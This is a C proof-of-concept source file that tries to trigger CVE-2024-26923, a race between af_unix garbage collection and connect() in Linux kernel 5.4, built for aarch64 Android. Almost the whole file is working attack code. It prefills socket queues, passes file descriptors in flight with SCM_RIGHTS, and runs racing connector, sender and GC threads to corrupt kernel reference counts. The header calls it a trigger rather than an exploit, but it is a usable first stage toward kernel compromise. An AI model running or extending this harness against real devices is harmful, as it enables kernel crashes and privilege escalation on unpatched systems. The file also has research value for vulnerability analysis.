/*
 * CVE-2024-26923 trigger attempt: af_unix GC vs connect() race.
 *
 * Target: 5.4.233 (fix is in 5.4.275, commit 343c5372).
 *
 * The bug (from the fix commit message):
 *   - L is a listening socket made in-flight via SCM_RIGHTS, original fd
 *     closed -> file_count(L) == inflight(L), so L is a GC candidate.
 *   - S is unconnected; connect(S, L) creates peer NS, sets unix_peer(S)=NS,
 *     releases S's state lock, and only then enqueues the embryo skb into L.
 *   - In that window sendmsg(S, [V]) queues V's skb on NS; close(V) makes V a
 *     candidate too.
 *   - unix_gc() scans L before the embryo is enqueued and again after; the
 *     second scan sees V through NS and bumps V->inflight to 2 while V's
 *     file_count is 1 -> later GC hits BUG_ON(total_refs < inflight_refs)
 *     or a dangling gc_inflight_list entry.
 *
 * This is a trigger harness, NOT an exploit: it only tries to win the race.
 * It does not touch selinux_state or any kernel data.
 *
 * Build (aarch64, NDK):
 *   aarch64-linux-android21-clang -fPIE -pie -O2 -pthread -w poc_26923.c -o poc_26923
 * Run (shell domain):
 *   ./poc_26923 30
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stddef.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sched.h>
#include <pthread.h>
#include <stdatomic.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/types.h>

#define BACKLOG     4096
#define PREFILL     512
#define PREFILL_FDS 16
#define N_CONN      8
#define N_GC        2
#define SENDS_PER   4000

static pthread_mutex_t l_lock = PTHREAD_MUTEX_INITIALIZER;
static struct sockaddr_un l_addr;
static socklen_t l_addrlen;
static int l_carrier = -1;
static int prefill_fds[PREFILL];
static int n_prefill;

static atomic_int stop_flag;
static atomic_ulong c_conn, c_send, c_gc, c_l;

static int send_fd(int sock, int fd)
{
    char b = 'X';
    struct iovec iov = { .iov_base = &b, .iov_len = 1 };
    char cbuf[CMSG_SPACE(sizeof(int))];
    struct msghdr msg;
    struct cmsghdr *c;

    memset(cbuf, 0, sizeof(cbuf));
    memset(&msg, 0, sizeof(msg));
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    msg.msg_control = cbuf;
    msg.msg_controllen = sizeof(cbuf);
    c = CMSG_FIRSTHDR(&msg);
    c->cmsg_level = SOL_SOCKET;
    c->cmsg_type = SCM_RIGHTS;
    c->cmsg_len = CMSG_LEN(sizeof(int));
    memcpy(CMSG_DATA(c), &fd, sizeof(fd));
    return sendmsg(sock, &msg, MSG_NOSIGNAL | MSG_DONTWAIT);
}

/*
 * Create a fresh listening L, make it in-flight (carrier keeps L's file
 * alive, original fd closed), then prefill its accept queue with embryos.
 * The prefill makes scan_children(L) walk many skbs, widening the window in
 * which the racing connect() can enqueue the embryo between GC's two scans.
 */
static int make_listener(void)
{
    struct sockaddr_un a;
    socklen_t len;
    int fd, cp[2];

    fd = socket(AF_UNIX, SOCK_STREAM, 0);
    if (fd < 0)
        return -1;
    memset(&a, 0, sizeof(a));
    a.sun_family = AF_UNIX;
    a.sun_path[0] = 0;
    snprintf(a.sun_path + 1, sizeof(a.sun_path) - 2,
             "poc26923-%d-%lu", (int)getpid(),
             (unsigned long)atomic_load(&c_l));
    len = (socklen_t)(offsetof(struct sockaddr_un, sun_path) + 1 +
                      strlen(a.sun_path + 1));
    if (bind(fd, (struct sockaddr *)&a, len) < 0)
        goto fail_fd;
    if (listen(fd, BACKLOG) < 0)
        goto fail_fd;
    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, cp) < 0)
        goto fail_fd;
    if (send_fd(cp[0], fd) != 1)
        goto fail_pair;
    close(cp[0]);

    pthread_mutex_lock(&l_lock);
    for (int i = 0; i < n_prefill; i++) {
        close(prefill_fds[i]);
        prefill_fds[i] = -1;
    }
    n_prefill = 0;
    l_addr = a;
    l_addrlen = len;
    if (l_carrier >= 0)
        close(l_carrier);
    l_carrier = cp[1];
    pthread_mutex_unlock(&l_lock);

    /* Fill L's accept queue.  Keep the client fds open so the embryos
     * (newsk, the connect() peer) stay alive in L's receive queue.  Each
     * embryo's peer gets PREFILL_FDS SCM_RIGHTS skbs so scan_children(L)
     * walks a long queue inside every embryo, widening the GC window. */
    for (int i = 0; i < PREFILL; i++) {
        int s = socket(AF_UNIX, SOCK_STREAM, 0);
        if (s < 0)
            break;
        if (connect(s, (struct sockaddr *)&a, len) < 0) {
            close(s);
            break;
        }
        for (int j = 0; j < PREFILL_FDS; j++) {
            int d = socket(AF_UNIX, SOCK_DGRAM, 0);
            if (d < 0)
                break;
            send_fd(s, d);
            close(d);
        }
        prefill_fds[n_prefill++] = s;
    }

    /* Closing the original fd leaves only the inflight reference: L now
     * satisfies file_count == inflight and is a GC candidate. */
    close(fd);
    atomic_fetch_add(&c_l, 1);
    return 0;

fail_pair:
    close(cp[0]);
    close(cp[1]);
fail_fd:
    close(fd);
    return -1;
}

struct sender_arg {
    int s;
};

static void *sender(void *arg)
{
    struct sender_arg *sa = arg;

    for (int i = 0; i < SENDS_PER && !atomic_load(&stop_flag); i++) {
        int v = socket(AF_UNIX, SOCK_STREAM, 0);
        int r;
        if (v < 0)
            break;
        r = send_fd(sa->s, v);
        close(v); /* send success: V is now inflight + file_count 1 */
        if (r == 1) {
            atomic_fetch_add(&c_send, 1);
            break;
        }
        sched_yield();
    }
    return NULL;
}

static void *connector(void *arg)
{
    (void)arg;
    while (!atomic_load(&stop_flag)) {
        struct sockaddr_un a;
        socklen_t len;
        struct sender_arg sa;
        pthread_t th;
        int s;

        pthread_mutex_lock(&l_lock);
        a = l_addr;
        len = l_addrlen;
        pthread_mutex_unlock(&l_lock);
        if (len == 0) {
            usleep(1000);
            continue;
        }

        s = socket(AF_UNIX, SOCK_STREAM, 0);
        if (s < 0)
            continue;
        sa.s = s;
        if (pthread_create(&th, NULL, sender, &sa) != 0) {
            close(s);
            continue;
        }
        connect(s, (struct sockaddr *)&a, len);
        pthread_join(th, NULL);
        close(s);
        atomic_fetch_add(&c_conn, 1);
        if ((atomic_load(&c_conn) & 0x3f) == 0)
            sched_yield();
    }
    return NULL;
}

static void *gc_thread(void *arg)
{
    (void)arg;
    while (!atomic_load(&stop_flag)) {
        int s = socket(AF_UNIX, SOCK_DGRAM, 0);
        if (s >= 0)
            close(s); /* unix_release_sock -> unix_gc() when inflight > 0 */
        atomic_fetch_add(&c_gc, 1);
        sched_yield();
    }
    return NULL;
}

/* Churn extra inflight candidates so GC's candidate list stays long. */
static void *filler(void *arg)
{
    (void)arg;
    while (!atomic_load(&stop_flag)) {
        int cp[2];
        if (socketpair(AF_UNIX, SOCK_DGRAM, 0, cp) < 0)
            break;
        for (int i = 0; i < 16; i++) {
            int d = socket(AF_UNIX, SOCK_DGRAM, 0);
            if (d < 0)
                break;
            send_fd(cp[0], d);
            close(d);
        }
        close(cp[0]);
        usleep(2000);
        close(cp[1]);
    }
    return NULL;
}

static void *refresher(void *arg)
{
    (void)arg;
    while (!atomic_load(&stop_flag)) {
        make_listener();
        sleep(5);
    }
    return NULL;
}

int main(int argc, char **argv)
{
    int secs = argc > 1 ? atoi(argv[1]) : 30;
    pthread_t th[N_CONN + N_GC + 2];

    setvbuf(stderr, NULL, _IONBF, 0);
    if (secs <= 0)
        secs = 30;

    if (make_listener() < 0) {
        fprintf(stderr, "[-] make_listener failed: %s\n", strerror(errno));
        return 1;
    }
    fprintf(stderr, "[poc] start pid=%d secs=%d\n", (int)getpid(), secs);

    for (int i = 0; i < N_CONN; i++)
        pthread_create(&th[i], NULL, connector, NULL);
    for (int i = 0; i < N_GC; i++)
        pthread_create(&th[N_CONN + i], NULL, gc_thread, NULL);
    pthread_create(&th[N_CONN + N_GC], NULL, filler, NULL);
    pthread_create(&th[N_CONN + N_GC + 1], NULL, refresher, NULL);

    for (int i = 0; i < secs; i++) {
        sleep(1);
        fprintf(stderr, "[poc] t=%ds conn=%lu send_ok=%lu gc=%lu L=%lu\n",
                i + 1, (unsigned long)atomic_load(&c_conn),
                (unsigned long)atomic_load(&c_send),
                (unsigned long)atomic_load(&c_gc),
                (unsigned long)atomic_load(&c_l));
    }

    atomic_store(&stop_flag, 1);
    for (int i = 0; i < N_CONN + N_GC + 2; i++)
        pthread_join(th[i], NULL);
    fprintf(stderr, "[poc] done conn=%lu send_ok=%lu gc=%lu L=%lu\n",
            (unsigned long)atomic_load(&c_conn),
            (unsigned long)atomic_load(&c_send),
            (unsigned long)atomic_load(&c_gc),
            (unsigned long)atomic_load(&c_l));
    return 0;
}
